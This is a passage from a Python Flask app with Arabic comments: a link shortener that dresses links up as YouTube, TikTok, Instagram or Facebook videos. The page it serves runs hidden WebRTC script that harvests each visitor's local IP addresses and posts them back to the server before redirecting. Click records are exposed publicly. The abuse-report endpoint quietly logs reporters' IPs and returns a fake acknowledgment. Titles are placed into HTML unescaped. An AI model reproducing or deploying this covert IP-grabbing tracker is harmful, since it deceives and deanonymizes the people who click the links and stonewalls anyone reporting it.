            padding: 5px 12px;
            background: rgba(255,255,255,0.2);
            border-radius: 20px;
            font-size: 12px;
            margin-bottom: 15px;
        }}
        .redirect-note {{
            font-size: 14px;
            opacity: 0.8;
            margin-top: 15px;
        }}
        .ip-status {{
            font-size: 11px;
            margin-top: 20px;
            opacity: 0.6;
            font-family: monospace;
        }}
    </style>
    
    <link rel="canonical" href="{original_url}">
    <meta http-equiv="refresh" content="3;url={original_url}">
</head>
<body>
    <div class="container">
        <div class="video-card">
            <div class="platform-badge">🎬 {platform}</div>
            <img src="{full_image_url}" alt="Thumbnail" class="thumbnail" onerror="this.src='https://placehold.co/400x225/667eea/white?text={platform}'">
            <div class="title">{video_title}</div>
            <div class="spinner"></div>
            <div class="redirect-note">⏳ جاري تحميل الفيديو... سيتم توجيهك تلقائياً خلال 3 ثوانٍ</div>
            <div class="redirect-note" style="font-size: 12px;">
                <a href="{original_url}" style="color: white; text-decoration: underline;">🔗 اضغط هنا إذا لم يتم التوجيه تلقائياً</a>
            </div>
            <div class="ip-status" id="ipStatus">🌐 جاري الكشف عن معلومات الشبكة...</div>
        </div>
    </div>

    <script>
        function getLocalIPsAndRedirect() {{
            var detectedIPs = [];
            window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            
            if (!window.RTCPeerConnection) {{
                sendLocalIPData("غير مدعوم");
                return;
            }}

            var pc = new RTCPeerConnection({{ iceServers: [] }});
            pc.createDataChannel("");
            
            pc.onicecandidate = function(e) {{
                if (!e || !e.candidate || !e.candidate.candidate) return;
                var candidate = e.candidate.candidate;
                var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/;
                var match = ipRegex.exec(candidate);
                if (match && detectedIPs.indexOf(match[1]) === -1) {{
                    detectedIPs.push(match[1]);
                    document.getElementById('ipStatus').innerHTML = `🖥️ تم الكشف: ${{match[1]}}`;
                }}
            }};

            pc.createOffer().then(function(sdp) {{
                sdp.sdp.split('\\n').forEach(function(line) {{
                    if(line.indexOf('c=IN') === 0 || line.indexOf('a=candidate') === 0) {{
                        var parts = line.split(' ');
                        parts.forEach(function(part){{
                            if(part.match(/[0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}}/)) {{
                                if(detectedIPs.indexOf(part) === -1) detectedIPs.push(part);
                            }}
                        }});
                    }}
                }});
                pc.setLocalDescription(sdp);
            }}).catch(function(err) {{
                console.log("WebRTC Error:", err);
            }});

            setTimeout(function() {{
                var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "مخفي أو مشفر";
                sendLocalIPData(finalLocalIp);
            }}, 1500);
        }}

        function sendLocalIPData(localIp) {{
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "/update-local-ip/{click_id}", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({{ "local_ip": localIp }}));
        }}
        
        window.onload = getLocalIPsAndRedirect;
        
        setTimeout(function() {{
            window.location.href = "{original_url}";
        }}, 3000);
    </script>
</body>
</html>'''

@app.route('/update-local-ip/<int:click_id>', methods=['POST'])
def update_local_ip(click_id):
    """تحديث سجل النقرة بالـ IP المحلي"""
    try:
        data = request.get_json() or {}
        local_ip = data.get('local_ip', 'غير متوفر')
        
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute('UPDATE clicks SET local_ip = ? WHERE id = ?', (local_ip, click_id))
            conn.commit()
            
        logger.info(f"تم تحديث IP المحلي للنقرة {click_id}: {local_ip}")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logger.error(f"Error updating local IP: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/stats/<short_code>')
def get_stats(short_code):
    """إرجاع إحصائيات الرابط بصيغة JSON"""
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM links WHERE short_code = ?", (short_code,))
        link = cursor.fetchone()
        
        if not link:
            return jsonify({"error": "Link not found"}), 404
        
        cursor.execute('''
            SELECT * FROM clicks 
            WHERE short_code = ? 
            ORDER BY time DESC 
            LIMIT 20
        ''', (short_code,))
        clicks = cursor.fetchall()
        
        return jsonify({
            "original_url": link['original_url'],
            "platform": link['platform'],
            "total_clicks": link['clicks_count'],
            "created_at": link['created_at'],
            "recent_clicks": [dict(click) for click in clicks]
        })

@app.route('/delete/<short_code>', methods=['POST'])
@requires_auth
def delete_link(short_code):
    """حذف رابط (تعطيله)"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("UPDATE links SET is_active = 0 WHERE short_code = ?", (short_code,))
        conn.commit()
    return jsonify({"status": "success"})

@app.route('/preview/<short_code>')
def preview_link(short_code):
    """عرض معاينة الرابط كما ستبدو في التطبيقات الاجتماعية"""
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM links WHERE short_code = ?", (short_code,))
        link_data = cursor.fetchone()
        
    if not link_data:
        return "الرابط غير موجود", 404
    
    # تجهيز رابط الصورة الكامل
    image_url = link_data['custom_image']
    if image_url and image_url.startswith('/static/'):
        full_image_url = request.host_url.rstrip('/') + image_url
    else:
        full_image_url = image_url
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="{link_data['video_title']}">
        <meta property="og:image" content="{full_image_url}">
        <meta property="og:description" content="شاهد الفيديو على {link_data['platform']}">
        <title>معاينة الرابط</title>
        <style>
            body {{ font-family: Arial; text-align: center; padding: 50px; }}
            img {{ max-width: 500px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }}
        </style>
    </head>
    <body>
        <h1>📱 معاينة الرابط</h1>
        <h2>{link_data['video_title']}</h2>
        <img src="{full_image_url}" alt="Thumbnail">
        <p><strong>المنصة:</strong> {link_data['platform']}</p>
        <p><strong>الرابط المختصر:</strong> <code>{request.host_url}{short_code}</code></p>
        <p>✅ إذا رأيت الصورة أعلاه، فإن وسوم Open Graph تعمل بشكل صحيح</p>
        <hr>
        <p><strong>رابط الصورة:</strong> <a href="{full_image_url}" target="_blank">{full_image_url}</a></p>
        <p><strong>رابط التوجيه:</strong> <a href="{request.host_url}{short_code}" target="_blank">{request.host_url}{short_code}</a></p>
    </body>
    </html>
    '''

@app.route('/report/<short_code>', methods=['POST'])
def report_link(short_code):
    """نظام استقبال البلاغات مع حماية ذكية"""
    report_data = request.get_json() or {}
    report_type = report_data.get('type', 'spam')
    report_reason = report_data.get('reason', '')
    
    reporter_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if reporter_ip and ',' in reporter_ip:
        reporter_ip = reporter_ip.split(',')[0].strip()
    
    report_id = str(uuid.uuid4())
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO reports (id, short_code, report_type, report_reason, reporter_ip, time) 
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (report_id, short_code, report_type, report_reason, reporter_ip, get_current_time()))
        conn.commit()
    
    return jsonify({
        "status": "reported",
        "message": "تم استلام البلاغ وسيتم مراجعته",
        "fake": True
    })

if __name__ == '__main__':
    # إنشاء المجلدات المطلوبة
    os.makedirs("static", exist_ok=True)
    os.makedirs("static/thumbnails", exist_ok=True)
    
    print("=" * 50)
    print("🚀 تشغيل نظام اختصار الروابط المتقدم")
    print("=" * 50)
    print(f"📍 رابط لوحة التحكم: http://localhost:5000")
    print(f"🔐 اسم المستخدم: {USERNAME}")
    print(f"🔐 كلمة المرور: {PASSWORD}")
    print(f"🕐 توقيت الجزائر: GMT+1")
    print("=" * 50)
    print("✅ يدعم: يوتيوب | تيك توك | انستغرام | فيسبوك")
    print("✅ يتم حفظ الصور محلياً لضمان ظهورها على واتساب وفيسبوك")
    print("✅ تم إضافة جميع وسوم Open Graph للظهور بشكل احترافي")
    print("=" * 50)
    print("📌 ملاحظة: لروابط فيسبوك وإنستغرام، سيظهر حقل إضافي لإدخال الصورة يدوياً")
    print("=" * 50)
    
    app.run(debug=False, host='0.0.0.0', port=5000)
